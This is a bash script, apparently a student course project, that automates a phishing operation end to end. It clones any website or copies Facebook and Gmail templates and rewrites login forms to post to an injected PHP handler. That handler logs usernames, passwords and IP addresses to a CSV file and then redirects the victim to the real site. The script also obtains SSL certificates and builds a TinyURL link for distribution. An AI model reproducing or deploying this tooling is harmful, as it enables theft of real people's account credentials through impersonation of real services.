#!/bin/bash

# Student: Topaz Daniel | XE107 | Lecturer: David Shiffman
# Project: Phishing Automation Script
# Description: Automates phishing page setup, SSL, Apache, credential capture, and short URL.
# Version=2.0

# COLORS
BLUE="\033[34m"
GREEN="\033[32m"
YELLOW="\033[33m"
RED="\033[31m"
RESET="\033[0m"

# 1. Show Title
show_title() {
    echo -e "${YELLOW}#############################################"
    echo -e "#       Setting up a Phishing page          #"
    echo -e "#############################################"
    echo -e "${RESET}"
    sleep 0.5
}
show_title

# 2. Check and Install Required Tools
check_and_install_tools() {
    REQUIRED_TOOLS=("wget" "apache2" "python3-certbot-apache" "libapache2-mod-php" "php-mysql" "php")
    echo -e "${YELLOW}[*] Checking and installing required tools...${RESET}"
    sleep 0.5

    for tool in "${REQUIRED_TOOLS[@]}"; do
        if ! dpkg -s "$tool" &> /dev/null; then
            echo -e "${YELLOW}[!] $tool is not installed. Installing...${RESET}"
            apt-get update -qq > /dev/null 2>&1
            apt-get install "$tool" -y > /dev/null 2>&1
            if dpkg -s "$tool" &> /dev/null; then
                echo -e "${GREEN}[\u2713] $tool installed successfully.${RESET}"
            else
                echo -e "${RED}[\u2717] Failed to install $tool. Please check manually.${RESET}"
            fi
        else
            echo -e "${GREEN}[\u2713] $tool is already installed.${RESET}"
        fi
        sleep 0.5
    done
}
check_and_install_tools

# 3. Set Permissions
set_permissions() {
    CURRENT_USER=$(whoami)
    echo -e "${YELLOW}☐ Setting permissions for /var/www/html for the current user - $CURRENT_USER ...${RESET}"
    sleep 0.5
    chown -R "$CURRENT_USER:$CURRENT_USER" /var/www/html/ > /dev/null 2>&1
    chmod -R 755 /var/www/html/ > /dev/null 2>&1
    systemctl restart apache2 > /dev/null 2>&1
    echo -e "${GREEN}☑${RESET} Permissions set for $CURRENT_USER and Apache restarted."
    echo ""
    sleep 1
}
set_permissions

# 4. Choose Target and Setup Template
TARGET_DIR="/var/www/html"
echo "============================================"
echo "         Choose the Phishing Method         "
echo "============================================"
echo "
1. Clone a website
2. Use a built-in template (Facebook, Gmail)"
read -p "Enter your choice [1 or 2]: " choice

case $choice in
    1)
        clear
        echo "You chose to clone a website."
        read -p "Enter the full URL to clone: " SITE_URL
        read -p "Enter the REAL domain to redirect after the capture (e.g., https://facebook.com): " REAL_DOMAIN

        DOMAIN=$(echo "$SITE_URL" | awk -F/ '{print $3}')
        CLONED_PATH="$TARGET_DIR/$DOMAIN"
        echo "Cloning $SITE_URL ..."

        chown -R www-data:www-data /home/kali/Phishing
        chmod -R 755 /home/kali/Phishing
        wget -p -k -E "$SITE_URL" -P "$TARGET_DIR"

        CLONED_FILE=$(find "$CLONED_PATH" -name "index.html" | head -n 1)
        if [ -f "$CLONED_FILE" ]; then
            echo "Main page located at $CLONED_FILE"
        else
            echo "No index.html file found after cloning. Exiting..."
            exit 1
        fi

        cat > "$CLONED_PATH/process.php" << EOF
<?php
\$username = \$_POST['username'] ?? \$_POST['email'] ?? 'NO_USER';
\$password = \$_POST['password'] ?? \$_POST['pw'] ?? 'NO_PASS';
\$ip = \$_SERVER['REMOTE_ADDR'];
\$timestamp = date('Y-m-d H:i:s');
\$data = "TimeStamp: \$timestamp, IP: \$ip, Username: \$username, Password: \$password\n";
file_put_contents("/home/kali/Phishing/Credentials.csv", \$data, FILE_APPEND);
header('Location: $REAL_DOMAIN');
exit();
?>
EOF

        setfacl -m u:www-data:x /home/kali
        chown -R www-data:www-data /var/www/html/"$CLONED_PATH"
        chmod 777 /home/kali/Phishing/
        sed -i 's|<form[^>]*action=["'\''"][^"'\''"]*["'\''"]|<form method="POST" action="process.php"|' "$CLONED_FILE"

        echo "Form in $CLONED_FILE updated to point to process.php."
        echo "Cloning and injection complete. Access via http://<your-ip>/$DOMAIN/"
        ;;

    2)
        clear
        echo "You chose template"
        echo "
1. Facebook
2. Gmail
99. Load your template"
        read -p "Choose which template to use: " temp

        if [ "$temp" == "1" ]; then
            cp -r /home/kali/Templates/Facebook/ "$TARGET_DIR/"
            setfacl -m u:www-data:x /home/kali
            chown -R www-data:www-data /var/www/html/Facebook/
            chmod 777 /home/kali/Templates/Facebook
            chmod 777 /home/kali/Templates/Facebook/Credentials.csv
            DOMAIN="Facebook"
            echo "Facebook template copied to $TARGET_DIR"

        elif [ "$temp" == "2" ]; then
            cp -r /home/kali/Templates/Gmail/ "$TARGET_DIR/"
            setfacl -m u:www-data:x /home/kali
            chown -R www-data:www-data /var/www/html/Gmail/
            chmod 777 /home/kali/Templates/Gmail
            chmod 777 /home/kali/Templates/Gmail/Credentials.csv
            DOMAIN="Gmail"
            echo "Gmail template copied to $TARGET_DIR"

        elif [ "$temp" == "99" ]; then
            read -p "[*] Write the domain name: " DOMAIN_NAME
            mkdir -p ~/Templates/$DOMAIN_NAME
            read -p "[*] Enter the *full* path of your project (main page must be index.html): " TEMPLATE_PATH

            if [ ! -d "$TEMPLATE_PATH" ]; then
                echo "[-] No directory was found, exiting..."
                exit 1
            else
                cp -r "$TEMPLATE_PATH"/* ~/Templates/$DOMAIN_NAME/
                DOMAIN="$DOMAIN_NAME"
                echo "[+] Your domain was added to ~/Templates/$DOMAIN_NAME"
            fi
        else
            echo "Invalid template choice. Exiting..."
            exit 1
        fi
        ;;

    *)
        echo "No valid option was chosen, exiting..."
        sleep 1
        ;;
esac

# 5. Domain and SSL Setup
echo ""
echo -en "${YELLOW}[*] Do you have a custom domain?${RESET}\n1. ${GREEN}Yes${RESET}\n2. ${RED}No${RESET}\n"
read -p "Write your choice, [1/2]: " DMN

if [ "$DMN" == 1 ]; then
    read -p "Please provide your domain: " DOMAIN_NAME
    echo "[*] Generating SSL certificate for $DOMAIN_NAME ..."
    certbot --apache -d "$DOMAIN_NAME" --non-interactive --agree-tos -m "admin@$DOMAIN_NAME"

    if [ $? -eq 0 ]; then
        echo -en "${GREEN}[*] SSL certificate successfully generated and configured for $DOMAIN_NAME${RESET}\n"
        echo -en "[*] ${GREEN}HTTPS enabled on port 443.${RESET}\n"
    else
        echo -en "${RED}[!] SSL certificate generation failed. Check domain and network settings, Exiting...${RESET}\n"
        exit 1
    fi

elif [ "$DMN" == 2 ]; then
    echo ""
    echo -en "${YELLOW}[*] Proceeding with HTTP (port 80) only...${RESET}\n"
else
    echo -en "${RED}[!] Invalid choice. Exiting...${RESET}\n"
    exit 1
fi

# 6. Short URL Creation
create_short_url() {
    echo ""
    echo -e "${YELLOW}[*] Creating public short URL for your phishing page...${RESET}"
    sleep 1

    ORIGINAL_URL="http://$(hostname -I | awk '{print $1}')/$DOMAIN/"
    echo -e "${BLUE}[+] Original URL: $ORIGINAL_URL${RESET}"

    SHORT_URL=$(curl -s "https://tinyurl.com/api-create.php?url=$ORIGINAL_URL")

    if [[ "$SHORT_URL" == http* ]]; then
        echo -e "${GREEN}[+] Short URL created: $SHORT_URL${RESET}"
    else
        echo -e "${RED}[!] Failed to generate short URL.${RESET}"
    fi
}
create_short_url
